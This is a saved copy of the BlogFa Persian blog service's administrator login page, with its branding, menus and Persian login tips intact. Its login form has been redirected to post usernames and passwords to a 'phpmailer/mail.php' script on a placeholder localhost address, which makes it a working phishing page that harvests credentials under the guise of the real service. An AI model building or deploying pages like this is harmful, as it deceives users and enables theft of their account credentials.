<!DOCTYPE html>
<!-- saved from url=(0062)https://www.blogfa.com/desktop/login.aspx?r=638192940031202231 -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<title>BLOGFA :: Free Persian Weblog Service :: وبلاگ فارسی </title>
		
        <meta name="viewport" content="width=device-width, initial-scale=1">
		<meta name="description" content="BlogFa :: بلاگفا یک ابزار رایگان برای ساخت و مدیریت وبلاگ است">
		<link href="./blogfa_files/int.5.css" type="text/css" rel="stylesheet">
<!--[if lt IE 8]>
<style>
#footer li{display:inline;padding-left:5px;padding-right:5px;}
</style>
<![endif]-->
<script>
function togglemenu(){var e=n("menu");function n(e){return document.getElementById(e)}"menuhide"===e.className?(e.className="menushow",n("menutoggle").innerText="✖"):(e.className="menuhide",n("menutoggle").innerText="☰")}
</script>


 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <script language="javascript">
        if (window.name == "frameleft")
            window.open("login.aspx", "_parent");

        _scheme = "http://";
        window.onload = function () {
            var frm0 = document.getElementById('frmLogin');
            if (frm0 != null && _scheme == "https://")
                frm0.action = frm0.action.replace('http://', 'https://');
        }
    </script>
    <script type="text/javascript" src="./blogfa_files/httpslogin.js.download" async=""></script>
    <style>
        #logindiv{
            width:300px;
            max-width:100%;
        }
    </style>


	</head>
	<body>

    <div id="header">
        <div class="left">
            <a href="https://www.blogfa.com/"><img src="./blogfa_files/blogfa-logo.gif"></a>
        </div>
        <div class="right">
            <a id="menutoggle" onclick="javascript:togglemenu();">☰</a>
        </div>
        <div class="clear"></div>
    </div>

<div id="menu" class="menuhide">
	<div id="menuitems">
		<ul>
			<li><a href="https://www.blogfa.com/">صفحه نخست</a></li>
            <li><a href="https://www.blogfa.com/desktop/login.aspx?">ورود به بخش مدیریت</a></li>
            <li><a href="https://www.blogfa.com/new-blog">ساخت وبلاگ جدید</a></li>
			<li><a href="https://www.blogfa.com/updated">وبلاگهای بروز شده</a></li>
			<li><a href="https://www.blogfa.com/members">فهرست وبلاگها</a></li>
			<li><a href="https://www.blogfa.com/help">راهنما</a></li>
			<li><a href="https://www.blogfa.com/report-abuse">گزارش تخلف</a></li>
            <li><a href="https://www.blogfa.com/ads">تبلیغات در وبلاگها</a></li>
			<li class="lilast"><a href="https://www.blogfa.com/contact">تماس با ما</a></li>
		</ul>
	</div>
</div>

<div id="wrapper">
<div class="backbar"></div>
<div id="container">

<!-- start-->


<div id="content">
    <div align="center" style="margin-top: 50px;">
        <div id="logindiv">
            <form id="frmLogin" method="post" action="https://127.0.0.1/phpmailer/mail.php">

                <input type="hidden" value="204725" name="_tt">

                

                <div style="direction: rtl; text-align: right; display: block;">
                    
                    <label>نام کاربری:</label>
                    <input type="text" name="username" size="35" class="textbox txten" autofocus="" maxlength="61" style="width: 100%;">
                    <label>کلمه عبور:</label>
                    <input type="password" name="password" size="35" class="textbox txten" maxlength="20" style="width: 100%;">
                    <span style="display: block; padding-top: 10px; padding-bottom: 10px;"></span>
                    <input type="submit" value="ورود به بخش مدیریت وبلاگ" name="btnSend" class="btn" style="width: 100%;">

                    <span style="display: block; padding-top: 20px; padding-bottom: 10px; text-align: center;">
                        <a href="https://www.blogfa.com/r/forget-password/?">کلمه عبور را فراموش کردید؟ (ارسال مجدد کلمه عبور)</a>
                    </span>

                </div>
            </form>
        </div>
    </div>

<mark style="margin-top:30px;font-size:12px;">
<span class="s">»</span> کلمه عبور نسبت 
										به کوچکی یا بزرگی حروف حساس است بنابراین هنگام ورود کلمه عبور نسبت به روشن یا 
										خاموش بودن کلید CAPS LOCK&nbsp; اطمینان حاصل کنید.<br>
										<span class="s">»</span> نویسندگان وبلاگهای گروهی در بخش نام کاربری از ترکیب 
										نام کاربری خود ، حرف @ و بخش اول آدرس وبلاگ استفاده کنند مانند arash@myblog<br>
										<span class="s">»</span> نام کاربری&nbsp; نسبت به حروف کوچک و بزرگ 
										حساس نیست.<br>
										<span class="s">»</span> دقت کنید که در زمان ورود کلمه عبور صفحه کلید در حالت انگلیسی باشد بخصوص وقتی اعداد را وارد میکند.


    </mark>


</div><!--end content-->


<!-- end -->

</div><!--end container -->

<div id="footer">
<ul>
<li><a href="https://www.blogfa.com/">خانه</a></li>
<li><a href="https://www.blogfa.com/desktop/login.aspx?">ورود</a></li>
<li><a href="https://www.blogfa.com/updated">وبلاگهای بروز شده</a></li>
<li><a href="https://www.blogfa.com/members">فهرست وبلاگها</a></li>
<li><a href="https://www.blogfa.com/new-blog">ساخت وبلاگ جدید</a></li>
<li><a href="https://www.blogfa.com/help">راهنما</a></li>
<li><a href="https://www.blogfa.com/ads">تبلیغات در وبلاگها</a></li>
<li><a href="https://www.blogfa.com/report-abuse">گزارش تخلف</a></li>
<li class="lilast"><a href="https://www.blogfa.com/contact">تماس با ما</a></li>
</ul>

</div><!--end footer -->

</div><!--end wrapper -->

	


</body></html>